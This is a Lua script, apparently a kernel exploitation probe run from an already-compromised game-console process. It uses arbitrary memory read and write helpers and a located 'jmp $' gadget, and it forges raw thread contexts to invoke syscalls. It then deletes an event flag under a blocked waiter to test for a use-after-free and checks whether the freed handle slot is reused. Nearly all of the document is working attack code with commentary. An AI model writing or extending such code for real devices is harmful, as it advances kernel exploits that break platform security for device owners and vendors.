-- CRASH_CLASS: HIGH (a kernel object is deleted while a thread waits on it)
-- PROBE 201a: delete an event flag under a blocked waiter
--
-- Context: 200a proved the wait really blocks and really wakes. Section C of
-- that probe created a flag with the bit clear, started a child in 542 with a
-- null timeout, set the bit 30 ms later from the main thread, and the child's
-- result page went from DEADBEEF to 1 — the satisfied mask, written after the
-- set, which can only happen if the child was asleep inside the wait.
--
-- That makes the delete path interesting: 539 frees the object, and a waiter is
-- holding a pointer to it. Three outcomes are possible and each is worth
-- knowing:
--
--   delete returns -1 or EBUSY          -> the object is refcounted; nothing here
--   delete returns 0, waiter never wakes -> a leaked waiter, harmless but noted
--   delete returns 0, waiter wakes or the
--     process later faults              -> the waiter is using freed memory
--
-- Section A blocks a waiter and deletes under it. Section B watches whether the
-- freed handle index is handed out again, and whether the waiter's late write
-- lands on the new object. Section C keeps a canary so a silent process death
-- cannot be mistaken for a quiet result.

print("=== PROBE 201a: delete under a blocked evf waiter ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function u64(v)
    if type(v) == "number" then return uint64(string.format("0x%08X", v)) end
    return v
end

local sc_getpid = make_syscall(20)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RSI, C_RDX, C_RCX = 0x048, 0x050, 0x058, 0x060
local C_R8, C_RAX = 0x068, 0x078

local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; aborting")
    return
end
local jmp_self = eboot_base + 0x15481
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[0] jmp $ mismatch; aborting")
    return
end
print("[0] eboot=" .. q(eboot_base) .. " sw=" .. q(SW))

local function page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do wq(p + off, uint64(0)) end
    return p
end

local function spawn(rax, rdi, rsi, rdx, rcx, r8, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, SW)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    wq(ctx + C_RSI, rsi)
    wq(ctx + C_RDX, rdx)
    wq(ctx + C_RCX, rcx)
    wq(ctx + C_R8, r8)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local function delay(n)
    local x = 0
    for k = 1, n do x = x + k end
    return x
end

local NAME = memory.alloc(0x40)
local function put_str(addr, s)
    for i = 1, #s do
        pcall(function() memory.write_byte(addr + i - 1, u64(string.byte(s, i))) end)
    end
    pcall(function() memory.write_byte(addr + #s, u64(0)) end)
end

local function call(num, a1, a2, a3, a4)
    local ok, rv = pcall(function()
        return make_syscall(num)(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0), u64(a4 or 0))
    end)
    if not ok then return nil end
    return rv:tonumber()
end

local function create(init)
    put_str(NAME, "evf_201a")
    local rv = call(538, NAME, init or 0, 0)
    return rv
end

local OUT = page(0x38)

---------------------------------------------------------------------------
-- [A] block a waiter, then delete under it
---------------------------------------------------------------------------
print("[A] waiter blocked, then delete")
local H = create(0)
print("    create(init=0) -> " .. tostring(H))
local tidA = nil
if H then
    wd(OUT, 0xDEADBEEF)
    local stack = page(0x38)
    wq(stack, jmp_self)
    local okA
    tidA, okA = spawn(uint64(542), uint64(H), uint64(1), uint64(1), uint64(OUT), uint64(0), stack)
    delay(400000)
    print("    before delete: tid=" .. q(tidA) .. " out=" .. string.format("%08X", rd(OUT) or 0)
        .. " kill(tid,0)=" .. tostring(call(433, tidA, 0)))
    local drv = call(539, H)
    print("    delete(H) -> " .. tostring(drv))
    delay(400000)
    print("    after delete:  out=" .. string.format("%08X", rd(OUT) or 0)
        .. " kill(tid,0)=" .. tostring(call(433, tidA, 0)))
end
print("")

---------------------------------------------------------------------------
-- [B] does the index come back, and can the waiter's object be reused
---------------------------------------------------------------------------
print("[B] handle index reuse after the delete")
local made = {}
for i = 1, 4 do
    local h = create(0)
    made[#made + 1] = h
    print(string.format("    create #%d -> %s", i, tostring(h)))
end
if H and made[1] then
    print(string.format("    deleted %s vs new %s (same index means the slot was reused)",
        string.format("%X", H), string.format("%X", made[1])))
end
print("    set on the deleted handle -> " .. tostring(call(544, H, 1)))
print("")

---------------------------------------------------------------------------
-- [C] canary and cleanup
---------------------------------------------------------------------------
if tidA then print("[C] kill waiter -> " .. tostring(call(433, tidA, 0))) end
for _, h in ipairs(made) do
    print("    delete(" .. tostring(h) .. ") -> " .. tostring(call(539, h)))
end
local ok5, pid1 = pcall(function() return sc_getpid():tonumber() end)
print("[C] canary ok=" .. tostring(ok5) .. " pid=" .. tostring(pid1) .. " first=" .. tostring(pid0))
print("")
print("=== PROBE 201a COMPLETE ===")
